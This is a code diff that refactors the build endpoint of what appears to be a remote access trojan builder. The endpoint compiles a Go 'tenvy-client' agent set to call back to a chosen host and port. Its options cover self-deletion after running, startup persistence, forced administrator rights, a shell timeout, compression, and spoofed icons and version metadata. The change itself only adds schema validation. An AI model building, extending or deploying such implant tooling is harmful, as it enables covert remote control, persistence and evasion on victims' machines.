@@ -6,55 +6,25 @@ import { tmpdir } from 'node:os';
 import { spawn } from 'node:child_process';
 import type { SpawnOptionsWithoutStdio } from 'node:child_process';
 import { randomBytes } from 'node:crypto';
+import { ZodError } from 'zod';
+import {
+	ALLOWED_EXTENSIONS_BY_OS,
+	TARGET_ARCHITECTURES_BY_OS,
+	TARGET_OS_VALUES,
+	buildRequestSchema,
+	type BuildRequest,
+	type BuildResponse,
+	type TargetArch,
+	type TargetOS
+} from '../../../../../shared/types/build';
 
-interface BuildRequestBody {
-	host: string;
-	port?: string | number;
-	outputFilename?: string;
-	outputExtension?: string;
-	targetOS?: string;
-	targetArch?: string;
-	installationPath?: string;
-	meltAfterRun?: boolean;
-	startupOnBoot?: boolean;
-	developerMode?: boolean;
-	pollIntervalMs?: string | number;
-	maxBackoffMs?: string | number;
-	shellTimeoutSeconds?: string | number;
-	mutexName?: string;
-	compressBinary?: boolean;
-	forceAdmin?: boolean;
-	fileIcon?: {
-		name?: string | null;
-		data?: string | null;
-	} | null;
-	fileInformation?: Record<string, unknown> | null;
-}
-
-interface BuildResponseBody {
-	success: boolean;
-	message: string;
-	outputPath?: string;
-	downloadUrl?: string;
-	log?: string[];
-	sharedSecret?: string;
-	warnings?: string[];
-}
-
-type TargetOS = 'windows' | 'linux' | 'darwin';
-
-const allowedTargetOS = new Set<TargetOS>(['windows', 'linux', 'darwin']);
-const architectureMatrix: Record<TargetOS, Set<string>> = {
-	windows: new Set(['amd64', '386', 'arm64']),
-	linux: new Set(['amd64', 'arm64']),
-	darwin: new Set(['amd64', 'arm64'])
-};
-
-const extensionMatrix: Record<TargetOS, string[]> = {
-	windows: ['.exe', '.bat'],
-	linux: ['.bin'],
-	darwin: ['.bin']
-};
+const allowedTargetOS = new Set<TargetOS>(TARGET_OS_VALUES);
+const architectureMatrix = new Map<TargetOS, Set<TargetArch>>(
+	TARGET_OS_VALUES.map((os) => [os, new Set(TARGET_ARCHITECTURES_BY_OS[os])])
+);
+const extensionMatrix = new Map<TargetOS, Set<string>>(
+	TARGET_OS_VALUES.map((os) => [os, new Set(ALLOWED_EXTENSIONS_BY_OS[os])])
+);
 
 const mutexSanitizer = /[^A-Za-z0-9._-]/g;
 const allowedFileInfoKeys = new Map<string, string>([
@@ -82,31 +52,31 @@ function resolveTargetOS(value?: string): TargetOS {
 	return 'windows';
 }
 
-function resolveTargetArch(value: string | undefined, targetOS: TargetOS): string {
-	const options = architectureMatrix[targetOS] ?? new Set<string>(['amd64']);
-	const fallback = Array.from(options)[0] ?? 'amd64';
+function resolveTargetArch(value: string | undefined, targetOS: TargetOS): TargetArch {
+	const options = architectureMatrix.get(targetOS) ?? new Set<TargetArch>(['amd64']);
+	const fallback = options.values().next().value ?? 'amd64';
 	if (!value) {
 		return fallback;
 	}
 	const normalized = value.toLowerCase().trim();
-	if (options.has(normalized)) {
-		return normalized;
+	if (options.has(normalized as TargetArch)) {
+		return normalized as TargetArch;
 	}
 	return fallback;
 }
 
 function resolveExtension(value: string | undefined, targetOS: TargetOS): string {
-	const options = extensionMatrix[targetOS] ?? extensionMatrix.windows;
+	const options = extensionMatrix.get(targetOS) ?? new Set(['.exe']);
 	if (!value) {
-		return options[0];
+		return options.values().next().value ?? '.exe';
 	}
 
 	const normalized = value.startsWith('.') ? value.toLowerCase() : `.${value.toLowerCase()}`;
-	if (options.includes(normalized)) {
+	if (options.has(normalized)) {
 		return normalized;
 	}
 
-	return options[0];
+	throw error(400, `Extension ${normalized} is not supported for ${targetOS} builds.`);
 }
 
 function sanitizeFilename(value: string, extension: string): string {
@@ -173,7 +143,7 @@ function sanitizeMutexName(value: string | undefined): string {
 type NormalizedFileInformation = Record<string, string>;
 
 function sanitizeFileInformationPayload(
-	payload: Record<string, unknown> | null | undefined
+	payload: BuildRequest['fileInformation'] | null | undefined
 ): NormalizedFileInformation {
 	if (!payload) {
 		return {};
@@ -198,6 +168,119 @@ function hasFileInformationPayload(payload: NormalizedFileInformation): boolean 
 }
 
 type VersionParts = { Major: number; Minor: number; Patch: number; Build: number };
+
+type NormalizedBuildRequest = {
+	host: string;
+	port: string;
+	targetOS: TargetOS;
+	targetArch: TargetArch;
+	outputExtension: string;
+	outputFilename: string;
+	installationPath: string;
+	meltAfterRun: boolean;
+	startupOnBoot: boolean;
+	developerMode: boolean;
+	mutexName: string;
+	compressBinary: boolean;
+	forceAdmin: boolean;
+	pollIntervalMs: string | null;
+	maxBackoffMs: string | null;
+	shellTimeoutSeconds: string | null;
+	fileIcon: BuildRequest['fileIcon'] | null | undefined;
+	fileInformation: BuildRequest['fileInformation'] | null | undefined;
+	raw: BuildRequest;
+};
+
+function formatZodError(err: ZodError): string {
+	const issue = err.issues[0];
+	if (!issue) {
+		return 'Invalid build payload.';
+	}
+	const path = issue.path.join('.') || 'payload';
+	return `${path}: ${issue.message}`;
+}
+
+export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequest {
+	let parsed: BuildRequest;
+	try {
+		parsed = buildRequestSchema.parse(body);
+	} catch (err) {
+		if (err instanceof ZodError) {
+			throw error(400, formatZodError(err));
+		}
+		throw error(400, 'Invalid build payload.');
+	}
+
+	const host = parsed.host.toString().trim();
+	if (!host) {
+		throw error(400, 'Host is required');
+	}
+
+	if (/\s/.test(host)) {
+		throw error(400, 'Host cannot contain whitespace');
+	}
+
+	const port = parsed.port !== undefined ? parsed.port.toString().trim() : '2332';
+	if (!/^\d+$/.test(port)) {
+		throw error(400, 'Port must be numeric');
+	}
+
+	const targetOS = resolveTargetOS(parsed.targetOS);
+	const targetArch = resolveTargetArch(parsed.targetArch, targetOS);
+	const outputExtension = resolveExtension(parsed.outputExtension, targetOS);
+	const outputFilename = sanitizeFilename(
+		(parsed.outputFilename ?? 'tenvy-client').toString().trim(),
+		outputExtension
+	);
+	const installationPath = (parsed.installationPath ?? '').toString().trim();
+	const developerMode = parsed.developerMode !== false;
+	const meltAfterRun = Boolean(parsed.meltAfterRun);
+	const startupOnBoot = Boolean(parsed.startupOnBoot);
+	const mutexName = sanitizeMutexName(parsed.mutexName);
+	const compressBinary = Boolean(parsed.compressBinary);
+	const forceAdmin = Boolean(parsed.forceAdmin);
+
+	const pollIntervalMs = sanitizePositiveInteger(
+		parsed.pollIntervalMs,
+		1000,
+		3_600_000,
+		'Poll interval'
+	);
+	const maxBackoffMs = sanitizePositiveInteger(
+		parsed.maxBackoffMs,
+		1000,
+		86_400_000,
+		'Max backoff'
+	);
+	const shellTimeoutSeconds = sanitizePositiveInteger(
+		parsed.shellTimeoutSeconds,
+		5,
+		7_200,
+		'Shell timeout'
+	);
+
+	return {
+		host,
+		port,
+		targetOS,
+		targetArch,
+		outputExtension,
+		outputFilename,
+		installationPath,
+		meltAfterRun,
+		startupOnBoot,
+		developerMode,
+		mutexName,
+		compressBinary,
+		forceAdmin,
+		pollIntervalMs,
+		maxBackoffMs,
+		shellTimeoutSeconds,
+		fileIcon: parsed.fileIcon ?? null,
+		fileInformation: parsed.fileInformation ?? null,
+		raw: parsed
+	} satisfies NormalizedBuildRequest;
+}
 
 function parseVersionParts(value: string | undefined): VersionParts | null {
 	if (!value) {
@@ -246,7 +329,9 @@ function sanitizeIconFilename(name: string | null | undefined): string {
 	return safe || 'icon.ico';
 }
 
-function normalizeFileIcon(payload: BuildRequestBody['fileIcon']): NormalizedFileIcon {
+function normalizeFileIcon(
+	payload: BuildRequest['fileIcon'] | null | undefined
+): NormalizedFileIcon {
 	if (!payload || typeof payload.data !== 'string') {
 		return null;
 	}
@@ -368,69 +453,40 @@ function generateSharedSecret(): string {
 }
 
 export const POST: RequestHandler = async ({ request }) => {
-	let payload: BuildRequestBody;
+	let body: unknown;
 	try {
-		payload = (await request.json()) as BuildRequestBody;
+		body = await request.json();
 	} catch (err) {
 		throw error(400, 'Invalid build payload');
 	}
 
-	const host = payload.host?.toString().trim();
-	if (!host) {
-		throw error(400, 'Host is required');
-	}
-
-	if (/\s/.test(host)) {
-		throw error(400, 'Host cannot contain whitespace');
-	}
-
-	const port = (payload.port ?? '2332').toString().trim();
-	if (!/^\d+$/.test(port)) {
-		throw error(400, 'Port must be numeric');
-	}
-
-	const developerMode = payload.developerMode !== false;
-	const targetOS = resolveTargetOS(payload.targetOS?.toString());
-	const targetArch = resolveTargetArch(payload.targetArch?.toString(), targetOS);
-	const outputExtension = resolveExtension(payload.outputExtension?.toString().trim(), targetOS);
-	const outputFilename = sanitizeFilename(
-		(payload.outputFilename ?? 'tenvy-client').toString().trim(),
-		outputExtension
-	);
-	const installationPath = (payload.installationPath ?? '').toString().trim();
+	const normalized = normalizeBuildRequestPayload(body);
+	const {
+		host,
+		port,
+		targetOS,
+		targetArch,
+		outputExtension,
+		outputFilename,
+		installationPath,
+		meltAfterRun,
+		startupOnBoot,
+		developerMode,
+		mutexName,
+		compressBinary,
+		forceAdmin,
+		pollIntervalMs,
+		maxBackoffMs,
+		shellTimeoutSeconds,
+		fileIcon,
+		fileInformation
+	} = normalized;
 	const sharedSecret = generateSharedSecret();
-	const meltAfterRun = Boolean(payload.meltAfterRun);
-	const startupOnBoot = Boolean(payload.startupOnBoot);
-	const mutexName = sanitizeMutexName(
-		payload.mutexName !== undefined && payload.mutexName !== null
-			? String(payload.mutexName)
-			: undefined
-	);
-	const compressBinary = Boolean(payload.compressBinary);
-	const forceAdmin = Boolean(payload.forceAdmin);
-	const iconPayload = normalizeFileIcon(payload.fileIcon ?? null);
-	const fileInformation = sanitizeFileInformationPayload(payload.fileInformation ?? null);
+	const iconPayload = normalizeFileIcon(fileIcon ?? null);
+	const fileInformationPayload = sanitizeFileInformationPayload(fileInformation ?? null);
 	const shouldEmbedResources =
-		targetOS === 'windows' && (iconPayload !== null || hasFileInformationPayload(fileInformation));
-
-	const pollIntervalMs = sanitizePositiveInteger(
-		payload.pollIntervalMs,
-		1000,
-		3_600_000,
-		'Poll interval'
-	);
-	const maxBackoffMs = sanitizePositiveInteger(
-		payload.maxBackoffMs,
-		1000,
-		86_400_000,
-		'Max backoff'
-	);
-	const shellTimeoutSeconds = sanitizePositiveInteger(
-		payload.shellTimeoutSeconds,
-		5,
-		7_200,
-		'Shell timeout'
-	);
+		targetOS === 'windows' &&
+		(iconPayload !== null || hasFileInformationPayload(fileInformationPayload));
 
 	const repoRoot = resolve(process.cwd(), '..');
 	let tempDir: string | null = null;
@@ -474,7 +530,7 @@ export const POST: RequestHandler = async ({ request }) => {
 		if (shouldEmbedResources) {
 			const cmdDir = join(workDir, 'cmd');
 			const iconFileName = iconPayload?.filename ?? null;
-			const versionConfig = buildVersionInfoConfig(fileInformation, iconFileName);
+			const versionConfig = buildVersionInfoConfig(fileInformationPayload, iconFileName);
 			await writeFile(
 				join(cmdDir, 'versioninfo.json'),
 				`${JSON.stringify(versionConfig, null, 2)}\n`,
@@ -531,7 +587,7 @@ export const POST: RequestHandler = async ({ request }) => {
 				.join('')
 				.split(/\r?\n/)
 				.filter((line) => line.trim().length > 0);
-			const response: BuildResponseBody = {
+			const response: BuildResponse = {
 				success: false,
 				message: `go build failed with exit code ${exitCode}`,
 				log: logLines,
@@ -556,7 +612,7 @@ export const POST: RequestHandler = async ({ request }) => {
 		await copyFile(tempBinaryPath, finalPath);
 		await chmod(finalPath, 0o755);
 
-		const response: BuildResponseBody = {
+		const response: BuildResponse = {
 			success: true,
 			message: 'Agent built successfully',
 			outputPath: finalPath,
